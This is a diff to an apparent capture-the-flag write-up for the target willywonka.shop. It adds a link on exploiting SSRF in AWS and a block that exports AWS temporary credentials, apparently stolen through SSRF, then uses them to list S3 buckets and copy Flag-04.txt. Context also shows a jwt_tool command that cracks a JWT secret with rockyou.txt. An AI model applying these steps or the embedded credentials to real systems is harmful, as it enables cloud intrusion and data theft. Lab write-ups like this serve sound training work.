@@ -64,6 +64,7 @@ More detail: ['Step4'](./step4.md)
 6. lfi and ssrf via xxe : https://hackerone.com/reports/347139
 7. xxe oob : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
 8. s3 bucket ssrf metadata : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
+9. exploitation s3 via ssrf : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/
 
 ---
 
@@ -86,4 +87,17 @@ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://willywonka.shop/
 
 ```bash
 python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt
+```
+
+* aws
+
+```bash
+export AWS_ACCESS_KEY_ID=ASIAZ47IG35A4F6ZY2ML
+export AWS_SECRET_ACCESS_KEY=bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn
+export AWS_DEFAULT_REGION=eu-west-3                                  
+export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=
+
+aws s3 ls                                      
+aws s3 ls s3://willywonka-shop
+aws s3 cp s3://willywonka-shop/Flag-04.txt .
 ```
